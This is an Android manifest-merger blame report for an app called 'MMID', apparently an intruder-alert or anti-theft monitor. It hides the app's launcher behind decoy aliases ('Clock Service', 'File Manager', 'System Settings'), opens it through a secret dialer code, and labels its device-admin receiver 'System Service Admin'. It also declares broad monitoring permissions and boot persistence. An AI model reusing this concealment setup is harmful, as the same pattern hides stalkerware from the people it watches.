app/build/intermediates/manifest_merge_blame_file/release/processReleaseMainManifest/manifest-merger-blame-release-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.mmids"
4    android:versionCode="2"
5    android:versionName="1.1" >
6
7    <uses-sdk
7-->INJECTED
8        android:minSdkVersion="26"
8-->INJECTED
9        android:targetSdkVersion="34" />
9-->INJECTED
10
11    <!-- Permissions -->
12    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
12-->src\main\AndroidManifest.xml:6:5-7:46
12-->src\main\AndroidManifest.xml:6:22-75
13    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
13-->src\main\AndroidManifest.xml:8:5-76
13-->src\main\AndroidManifest.xml:8:22-74
14    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
14-->src\main\AndroidManifest.xml:9:5-86
14-->src\main\AndroidManifest.xml:9:22-84
15    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
15-->src\main\AndroidManifest.xml:10:5-77
15-->src\main\AndroidManifest.xml:10:22-75
16    <uses-permission android:name="android.permission.VIBRATE" />
16-->src\main\AndroidManifest.xml:11:5-65
16-->src\main\AndroidManifest.xml:11:22-63
17    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
17-->src\main\AndroidManifest.xml:12:5-79
17-->src\main\AndroidManifest.xml:12:22-77
18    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
18-->src\main\AndroidManifest.xml:13:5-80
18-->src\main\AndroidManifest.xml:13:22-78
19    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
19-->src\main\AndroidManifest.xml:14:5-76
19-->src\main\AndroidManifest.xml:14:22-74
20    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
20-->src\main\AndroidManifest.xml:15:5-80
20-->src\main\AndroidManifest.xml:15:22-78
21    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
21-->src\main\AndroidManifest.xml:16:5-74
21-->src\main\AndroidManifest.xml:16:22-72
22    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
22-->src\main\AndroidManifest.xml:17:5-75
22-->src\main\AndroidManifest.xml:17:22-73
23    <uses-permission
23-->src\main\AndroidManifest.xml:18:5-19:37
24        android:name="android.permission.READ_EXTERNAL_STORAGE"
24-->src\main\AndroidManifest.xml:18:22-77
25        android:maxSdkVersion="32" />
25-->src\main\AndroidManifest.xml:19:9-35
26    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
26-->src\main\AndroidManifest.xml:20:5-75
26-->src\main\AndroidManifest.xml:20:22-73
27    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
27-->src\main\AndroidManifest.xml:21:5-94
27-->src\main\AndroidManifest.xml:21:22-92
28    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
28-->src\main\AndroidManifest.xml:22:5-118
28-->src\main\AndroidManifest.xml:22:22-74
29    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
29-->src\main\AndroidManifest.xml:23:5-80
29-->src\main\AndroidManifest.xml:23:22-78
30
31    <permission
31-->[androidx.core:core:1.12.0] AndroidManifest.xml:22:5-24:47
32        android:name="com.mmids.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
32-->[androidx.core:core:1.12.0] AndroidManifest.xml:23:9-81
33        android:protectionLevel="signature" />
33-->[androidx.core:core:1.12.0] AndroidManifest.xml:24:9-44
34
35    <uses-permission android:name="com.mmids.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
35-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:5-97
35-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:22-94
36
37    <application
37-->src\main\AndroidManifest.xml:25:5-222:19
38        android:name="com.mmids.MMIDSApp"
38-->src\main\AndroidManifest.xml:26:9-33
39        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
39-->[androidx.core:core:1.12.0] AndroidManifest.xml:28:18-86
40        android:enableOnBackInvokedCallback="true"
40-->src\main\AndroidManifest.xml:31:9-51
41        android:extractNativeLibs="false"
41-->INJECTED
42        android:icon="@mipmap/ic_launcher"
42-->src\main\AndroidManifest.xml:28:9-43
43        android:label="MMID"
43-->src\main\AndroidManifest.xml:27:9-29
44        android:roundIcon="@mipmap/ic_launcher_round"
44-->src\main\AndroidManifest.xml:29:9-54
45        android:theme="@style/Theme.MMIDS" >
45-->src\main\AndroidManifest.xml:30:9-43
46
47        <!-- Main Activity — NO launcher intent -->
48        <activity
48-->src\main\AndroidManifest.xml:34:9-42:48
49            android:name="com.mmids.MainActivity"
49-->src\main\AndroidManifest.xml:35:13-41
50            android:configChanges="orientation|screenSize|screenLayout|density|uiMode"
50-->src\main\AndroidManifest.xml:41:13-87
51            android:exported="true"
51-->src\main\AndroidManifest.xml:36:13-36
52            android:launchMode="singleTop"
52-->src\main\AndroidManifest.xml:39:13-43
53            android:resizeableActivity="true"
53-->src\main\AndroidManifest.xml:42:13-46
54            android:showWhenLocked="true"
54-->src\main\AndroidManifest.xml:37:13-42
55            android:turnScreenOn="true"
55-->src\main\AndroidManifest.xml:38:13-40
56            android:windowSoftInputMode="adjustResize" />
56-->src\main\AndroidManifest.xml:40:13-55
57
58        <activity-alias
58-->src\main\AndroidManifest.xml:133:9-142:26
59            android:name="com.mmids.AliasFiles"
59-->src\main\AndroidManifest.xml:133:25-51
60            android:enabled="false"
60-->src\main\AndroidManifest.xml:135:13-36
61            android:exported="true"
61-->src\main\AndroidManifest.xml:135:37-60
62            android:icon="@mipmap/ic_launcher"
62-->src\main\AndroidManifest.xml:136:42-76
63            android:label="File Manager"
63-->src\main\AndroidManifest.xml:136:13-41
64            android:roundIcon="@mipmap/ic_launcher_round"
64-->src\main\AndroidManifest.xml:137:13-58
65            android:targetActivity="com.mmids.MainActivity" >
65-->src\main\AndroidManifest.xml:134:13-51
66            <intent-filter>
66-->src\main\AndroidManifest.xml:50:13-53:29
67                <action android:name="android.intent.action.MAIN" />
67-->src\main\AndroidManifest.xml:51:17-68
67-->src\main\AndroidManifest.xml:51:25-66
68
69                <category android:name="android.intent.category.LAUNCHER" />
69-->src\main\AndroidManifest.xml:52:17-76
69-->src\main\AndroidManifest.xml:52:27-74
70            </intent-filter>
71        </activity-alias>
72        <activity-alias
72-->src\main\AndroidManifest.xml:122:9-131:26
73            android:name="com.mmids.AliasClock"
73-->src\main\AndroidManifest.xml:122:25-51
74            android:enabled="false"
74-->src\main\AndroidManifest.xml:124:13-36
75            android:exported="true"
75-->src\main\AndroidManifest.xml:124:37-60
76            android:icon="@mipmap/ic_launcher"
76-->src\main\AndroidManifest.xml:125:43-77
77            android:label="Clock Service"
77-->src\main\AndroidManifest.xml:125:13-42
78            android:roundIcon="@mipmap/ic_launcher_round"
78-->src\main\AndroidManifest.xml:126:13-58
79            android:targetActivity="com.mmids.MainActivity" >
79-->src\main\AndroidManifest.xml:123:13-51
80            <intent-filter>
80-->src\main\AndroidManifest.xml:50:13-53:29
81                <action android:name="android.intent.action.MAIN" />
81-->src\main\AndroidManifest.xml:51:17-68
81-->src\main\AndroidManifest.xml:51:25-66
82
83                <category android:name="android.intent.category.LAUNCHER" />
83-->src\main\AndroidManifest.xml:52:17-76
83-->src\main\AndroidManifest.xml:52:27-74
84            </intent-filter>
85        </activity-alias>
86        <activity-alias
86-->src\main\AndroidManifest.xml:111:9-120:26
87            android:name="com.mmids.AliasNetwork"
87-->src\main\AndroidManifest.xml:111:25-53
88            android:enabled="false"
88-->src\main\AndroidManifest.xml:113:13-36
89            android:exported="true"
89-->src\main\AndroidManifest.xml:113:37-60
90            android:icon="@mipmap/ic_launcher"
90-->src\main\AndroidManifest.xml:114:42-76
91            android:label="Network Info"
91-->src\main\AndroidManifest.xml:114:13-41
92            android:roundIcon="@mipmap/ic_launcher_round"
92-->src\main\AndroidManifest.xml:115:13-58
93            android:targetActivity="com.mmids.MainActivity" >
93-->src\main\AndroidManifest.xml:112:13-51
94            <intent-filter>
94-->src\main\AndroidManifest.xml:50:13-53:29
95                <action android:name="android.intent.action.MAIN" />
95-->src\main\AndroidManifest.xml:51:17-68
95-->src\main\AndroidManifest.xml:51:25-66
96
97                <category android:name="android.intent.category.LAUNCHER" />
97-->src\main\AndroidManifest.xml:52:17-76
97-->src\main\AndroidManifest.xml:52:27-74
98            </intent-filter>
99        </activity-alias>
100        <activity-alias
100-->src\main\AndroidManifest.xml:100:9-109:26
101            android:name="com.mmids.AliasBattery"
101-->src\main\AndroidManifest.xml:100:25-53
102            android:enabled="false"
102-->src\main\AndroidManifest.xml:102:13-36
103            android:exported="true"
103-->src\main\AndroidManifest.xml:102:37-60
104            android:icon="@mipmap/ic_launcher"
104-->src\main\AndroidManifest.xml:103:45-79
105            android:label="Battery Manager"
105-->src\main\AndroidManifest.xml:103:13-44
106            android:roundIcon="@mipmap/ic_launcher_round"
106-->src\main\AndroidManifest.xml:104:13-58
107            android:targetActivity="com.mmids.MainActivity" >
107-->src\main\AndroidManifest.xml:101:13-51
108            <intent-filter>
108-->src\main\AndroidManifest.xml:50:13-53:29
109                <action android:name="android.intent.action.MAIN" />
109-->src\main\AndroidManifest.xml:51:17-68
109-->src\main\AndroidManifest.xml:51:25-66
110
111                <category android:name="android.intent.category.LAUNCHER" />
111-->src\main\AndroidManifest.xml:52:17-76
111-->src\main\AndroidManifest.xml:52:27-74
112            </intent-filter>
113        </activity-alias>
114        <activity-alias
114-->src\main\AndroidManifest.xml:89:9-98:26
115            android:name="com.mmids.AliasStats"
115-->src\main\AndroidManifest.xml:89:25-51
116            android:enabled="false"
116-->src\main\AndroidManifest.xml:91:13-36
117            android:exported="true"
117-->src\main\AndroidManifest.xml:91:37-60
118            android:icon="@mipmap/ic_launcher"
118-->src\main\AndroidManifest.xml:92:41-75
119            android:label="Usage Stats"
119-->src\main\AndroidManifest.xml:92:13-40
120            android:roundIcon="@mipmap/ic_launcher_round"
120-->src\main\AndroidManifest.xml:93:13-58
121            android:targetActivity="com.mmids.MainActivity" >
121-->src\main\AndroidManifest.xml:90:13-51
122            <intent-filter>
122-->src\main\AndroidManifest.xml:50:13-53:29
123                <action android:name="android.intent.action.MAIN" />
123-->src\main\AndroidManifest.xml:51:17-68
123-->src\main\AndroidManifest.xml:51:25-66
124
125                <category android:name="android.intent.category.LAUNCHER" />
125-->src\main\AndroidManifest.xml:52:17-76
125-->src\main\AndroidManifest.xml:52:27-74
126            </intent-filter>
127        </activity-alias>
128        <activity-alias
128-->src\main\AndroidManifest.xml:78:9-87:26
129            android:name="com.mmids.AliasTool"
129-->src\main\AndroidManifest.xml:78:25-50
130            android:enabled="false"
130-->src\main\AndroidManifest.xml:80:13-36
131            android:exported="true"
131-->src\main\AndroidManifest.xml:80:37-60
132            android:icon="@mipmap/ic_launcher"
132-->src\main\AndroidManifest.xml:81:42-76
133            android:label="Device Tools"
133-->src\main\AndroidManifest.xml:81:13-41
134            android:roundIcon="@mipmap/ic_launcher_round"
134-->src\main\AndroidManifest.xml:82:13-58
135            android:targetActivity="com.mmids.MainActivity" >
135-->src\main\AndroidManifest.xml:79:13-51
136            <intent-filter>
136-->src\main\AndroidManifest.xml:50:13-53:29
137                <action android:name="android.intent.action.MAIN" />
137-->src\main\AndroidManifest.xml:51:17-68
137-->src\main\AndroidManifest.xml:51:25-66
138
139                <category android:name="android.intent.category.LAUNCHER" />
139-->src\main\AndroidManifest.xml:52:17-76
139-->src\main\AndroidManifest.xml:52:27-74
140            </intent-filter>
141        </activity-alias>
142        <activity-alias
142-->src\main\AndroidManifest.xml:67:9-76:26
143            android:name="com.mmids.AliasSignal"
143-->src\main\AndroidManifest.xml:67:25-52
144            android:enabled="false"
144-->src\main\AndroidManifest.xml:69:13-36
145            android:exported="true"
145-->src\main\AndroidManifest.xml:69:37-60
146            android:icon="@mipmap/ic_launcher"
146-->src\main\AndroidManifest.xml:70:44-78
147            android:label="Signal Monitor"
147-->src\main\AndroidManifest.xml:70:13-43
148            android:roundIcon="@mipmap/ic_launcher_round"
148-->src\main\AndroidManifest.xml:71:13-58
149            android:targetActivity="com.mmids.MainActivity" >
149-->src\main\AndroidManifest.xml:68:13-51
150            <intent-filter>
150-->src\main\AndroidManifest.xml:50:13-53:29
151                <action android:name="android.intent.action.MAIN" />
151-->src\main\AndroidManifest.xml:51:17-68
151-->src\main\AndroidManifest.xml:51:25-66
152
153                <category android:name="android.intent.category.LAUNCHER" />
153-->src\main\AndroidManifest.xml:52:17-76
153-->src\main\AndroidManifest.xml:52:27-74
154            </intent-filter>
155        </activity-alias>
156        <activity-alias
156-->src\main\AndroidManifest.xml:56:9-65:26
157            android:name="com.mmids.AliasSettings"
157-->src\main\AndroidManifest.xml:56:25-54
158            android:enabled="false"
158-->src\main\AndroidManifest.xml:58:13-36
159            android:exported="true"
159-->src\main\AndroidManifest.xml:58:37-60
160            android:icon="@mipmap/ic_launcher"
160-->src\main\AndroidManifest.xml:59:45-79
161            android:label="System Settings"
161-->src\main\AndroidManifest.xml:59:13-44
162            android:roundIcon="@mipmap/ic_launcher_round"
162-->src\main\AndroidManifest.xml:60:13-58
163            android:targetActivity="com.mmids.MainActivity" >
163-->src\main\AndroidManifest.xml:57:13-51
164            <intent-filter>
164-->src\main\AndroidManifest.xml:50:13-53:29
165                <action android:name="android.intent.action.MAIN" />
165-->src\main\AndroidManifest.xml:51:17-68
165-->src\main\AndroidManifest.xml:51:25-66
166
167                <category android:name="android.intent.category.LAUNCHER" />
167-->src\main\AndroidManifest.xml:52:17-76
167-->src\main\AndroidManifest.xml:52:27-74
168            </intent-filter>
169        </activity-alias> <!-- Hidden launcher aliases — only one enabled at a time -->
170        <activity-alias
170-->src\main\AndroidManifest.xml:45:9-54:26
171            android:name="com.mmids.AliasMMID"
171-->src\main\AndroidManifest.xml:45:25-50
172            android:enabled="true"
172-->src\main\AndroidManifest.xml:47:13-35
173            android:exported="true"
173-->src\main\AndroidManifest.xml:47:36-59
174            android:icon="@mipmap/ic_launcher"
174-->src\main\AndroidManifest.xml:48:34-68
175            android:label="MMID"
175-->src\main\AndroidManifest.xml:48:13-33
176            android:roundIcon="@mipmap/ic_launcher_round"
176-->src\main\AndroidManifest.xml:49:13-58
177            android:targetActivity="com.mmids.MainActivity" >
177-->src\main\AndroidManifest.xml:46:13-51
178            <intent-filter>
178-->src\main\AndroidManifest.xml:50:13-53:29
179                <action android:name="android.intent.action.MAIN" />
179-->src\main\AndroidManifest.xml:51:17-68
179-->src\main\AndroidManifest.xml:51:25-66
180
181                <category android:name="android.intent.category.LAUNCHER" />
181-->src\main\AndroidManifest.xml:52:17-76
181-->src\main\AndroidManifest.xml:52:27-74
182            </intent-filter>
183        </activity-alias>
184
185        <!-- Intruder Alert Activity -->
186        <activity
186-->src\main\AndroidManifest.xml:145:9-153:51
187            android:name="com.mmids.ui.screens.IntruderAlertActivity"
187-->src\main\AndroidManifest.xml:146:13-61
188            android:excludeFromRecents="true"
188-->src\main\AndroidManifest.xml:152:13-46
189            android:exported="false"
189-->src\main\AndroidManifest.xml:147:13-37
190            android:launchMode="singleInstance"
190-->src\main\AndroidManifest.xml:151:13-48
191            android:screenOrientation="portrait"
191-->src\main\AndroidManifest.xml:153:13-49
192            android:showWhenLocked="true"
192-->src\main\AndroidManifest.xml:148:13-42
193            android:theme="@style/Theme.MMIDS"
193-->src\main\AndroidManifest.xml:150:13-47
194            android:turnScreenOn="true" />
194-->src\main\AndroidManifest.xml:149:13-40
195
196        <!-- Receivers -->
197        <receiver
197-->src\main\AndroidManifest.xml:156:9-160:20
198            android:name="com.mmids.receivers.VolumeReceiver"
198-->src\main\AndroidManifest.xml:156:19-59
199            android:exported="false" >
199-->src\main\AndroidManifest.xml:156:60-84
200            <intent-filter>
200-->src\main\AndroidManifest.xml:157:13-159:29
201                <action android:name="android.media.VOLUME_CHANGED_ACTION" />
201-->src\main\AndroidManifest.xml:158:17-77
201-->src\main\AndroidManifest.xml:158:25-75
202            </intent-filter>
203        </receiver>
204        <receiver
204-->src\main\AndroidManifest.xml:162:9-166:20
205            android:name="com.mmids.receivers.UnlockReceiver"
205-->src\main\AndroidManifest.xml:162:19-59
206            android:exported="false" >
206-->src\main\AndroidManifest.xml:162:60-84
207            <intent-filter>
207-->src\main\AndroidManifest.xml:163:13-165:29
208                <action android:name="android.intent.action.USER_PRESENT" />
208-->src\main\AndroidManifest.xml:164:17-76
208-->src\main\AndroidManifest.xml:164:25-74
209            </intent-filter>
210        </receiver>
211        <receiver
211-->src\main\AndroidManifest.xml:168:9-176:20
212            android:name="com.mmids.receivers.DialerReceiver"
212-->src\main\AndroidManifest.xml:168:19-59
213            android:exported="true" >
213-->src\main\AndroidManifest.xml:168:60-83
214            <intent-filter android:priority="1000" >
214-->src\main\AndroidManifest.xml:169:13-171:29
214-->src\main\AndroidManifest.xml:169:28-51
215                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
215-->src\main\AndroidManifest.xml:170:17-81
215-->src\main\AndroidManifest.xml:170:25-79
216            </intent-filter>
217            <intent-filter>
217-->src\main\AndroidManifest.xml:172:13-175:29
218                <action android:name="android.provider.Telephony.SECRET_CODE" />
218-->src\main\AndroidManifest.xml:173:17-81
218-->src\main\AndroidManifest.xml:173:25-78
219
220                <data
220-->src\main\AndroidManifest.xml:174:17-83
221                    android:host="66437"
221-->src\main\AndroidManifest.xml:174:60-80
222                    android:scheme="android_secret_code" />
222-->src\main\AndroidManifest.xml:174:23-59
223            </intent-filter>
224        </receiver>
225        <receiver
225-->src\main\AndroidManifest.xml:178:9-184:20
226            android:name="com.mmids.receivers.ShutdownReceiver"
226-->src\main\AndroidManifest.xml:178:19-61
227            android:exported="true" >
227-->src\main\AndroidManifest.xml:178:62-85
228            <intent-filter android:priority="1000" >
228-->src\main\AndroidManifest.xml:179:13-183:29
228-->src\main\AndroidManifest.xml:179:28-51
229                <action android:name="android.intent.action.ACTION_SHUTDOWN" />
229-->src\main\AndroidManifest.xml:180:17-79
229-->src\main\AndroidManifest.xml:180:25-77
230                <action android:name="android.intent.action.REBOOT" />
230-->src\main\AndroidManifest.xml:181:17-70
230-->src\main\AndroidManifest.xml:181:25-68
231                <action android:name="android.intent.action.QUICKBOOT_POWEROFF" />
231-->src\main\AndroidManifest.xml:182:17-82
231-->src\main\AndroidManifest.xml:182:25-80
232            </intent-filter>
233        </receiver>
234
235        <!-- Auto-start on device boot -->
236        <receiver
236-->src\main\AndroidManifest.xml:187:9-200:20
237            android:name="com.mmids.receivers.BootReceiver"
237-->src\main\AndroidManifest.xml:188:13-51
238            android:directBootAware="true"
238-->src\main\AndroidManifest.xml:191:13-43
239            android:enabled="true"
239-->src\main\AndroidManifest.xml:190:13-35
240            android:exported="true"
240-->src\main\AndroidManifest.xml:189:13-36
241            android:permission="android.permission.RECEIVE_BOOT_COMPLETED" >
241-->src\main\AndroidManifest.xml:192:13-75
242            <intent-filter android:priority="1000" >
242-->src\main\AndroidManifest.xml:193:13-199:29
242-->src\main\AndroidManifest.xml:193:28-51
243                <action android:name="android.intent.action.BOOT_COMPLETED" />
243-->src\main\AndroidManifest.xml:194:17-78
243-->src\main\AndroidManifest.xml:194:25-76
244                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
244-->src\main\AndroidManifest.xml:195:17-85
244-->src\main\AndroidManifest.xml:195:25-83
245                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
245-->src\main\AndroidManifest.xml:196:17-81
245-->src\main\AndroidManifest.xml:196:25-79
246                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
246-->src\main\AndroidManifest.xml:197:17-81
246-->src\main\AndroidManifest.xml:197:25-79
247
248                <category android:name="android.intent.category.DEFAULT" />
248-->src\main\AndroidManifest.xml:198:17-75
248-->src\main\AndroidManifest.xml:198:27-73
249            </intent-filter>
250        </receiver>
251        <receiver
251-->src\main\AndroidManifest.xml:202:9-213:20
252            android:name="com.mmids.admin.MMIDSDeviceAdmin"
252-->src\main\AndroidManifest.xml:203:13-51
253            android:exported="true"
253-->src\main\AndroidManifest.xml:204:13-36
254            android:label="System Service Admin"
254-->src\main\AndroidManifest.xml:205:13-49
255            android:permission="android.permission.BIND_DEVICE_ADMIN" >
255-->src\main\AndroidManifest.xml:206:13-70
256            <meta-data
256-->src\main\AndroidManifest.xml:207:13-209:64
257                android:name="android.app.device_admin"
257-->src\main\AndroidManifest.xml:208:17-56
258                android:resource="@xml/device_admin_policies" />
258-->src\main\AndroidManifest.xml:209:17-62
259
260            <intent-filter>
260-->src\main\AndroidManifest.xml:210:13-212:29
261                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
261-->src\main\AndroidManifest.xml:211:17-81
261-->src\main\AndroidManifest.xml:211:25-79
262            </intent-filter>
263        </receiver>
264
265        <!-- Foreground Service -->
266        <service
266-->src\main\AndroidManifest.xml:216:9-220:43
267            android:name="com.mmids.services.MonitoringService"
267-->src\main\AndroidManifest.xml:217:13-55
268            android:exported="false"
268-->src\main\AndroidManifest.xml:219:13-37
269            android:foregroundServiceType="dataSync"
269-->src\main\AndroidManifest.xml:218:13-53
270            android:stopWithTask="false" />
270-->src\main\AndroidManifest.xml:220:13-41
271
272        <provider
272-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:24:9-32:20
273            android:name="androidx.startup.InitializationProvider"
273-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:25:13-67
274            android:authorities="com.mmids.androidx-startup"
274-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:26:13-68
275            android:exported="false" >
275-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:27:13-37
276            <meta-data
276-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:29:13-31:52
277                android:name="androidx.emoji2.text.EmojiCompatInitializer"
277-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:30:17-75
278                android:value="androidx.startup" />
278-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:31:17-49
279            <meta-data
279-->[androidx.lifecycle:lifecycle-process:2.7.0] AndroidManifest.xml:29:13-31:52
280                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
280-->[androidx.lifecycle:lifecycle-process:2.7.0] AndroidManifest.xml:30:17-78
281                android:value="androidx.startup" />
281-->[androidx.lifecycle:lifecycle-process:2.7.0] AndroidManifest.xml:31:17-49
282            <meta-data
282-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:29:13-31:52
283                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
283-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:30:17-85
284                android:value="androidx.startup" />
284-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:31:17-49
285        </provider>
286
287        <receiver
287-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:34:9-52:20
288            android:name="androidx.profileinstaller.ProfileInstallReceiver"
288-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:35:13-76
289            android:directBootAware="false"
289-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:36:13-44
290            android:enabled="true"
290-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:37:13-35
291            android:exported="true"
291-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:38:13-36
292            android:permission="android.permission.DUMP" >
292-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:39:13-57
293            <intent-filter>
293-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:40:13-42:29
294                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
294-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:17-91
294-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:25-88
295            </intent-filter>
296            <intent-filter>
296-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:43:13-45:29
297                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
297-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:17-85
297-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:25-82
298            </intent-filter>
299            <intent-filter>
299-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:46:13-48:29
300                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
300-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:17-88
300-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:25-85
301            </intent-filter>
302            <intent-filter>
302-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:49:13-51:29
303                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
303-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:17-95
303-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:25-92
304            </intent-filter>
305        </receiver>
306    </application>
307
308</manifest>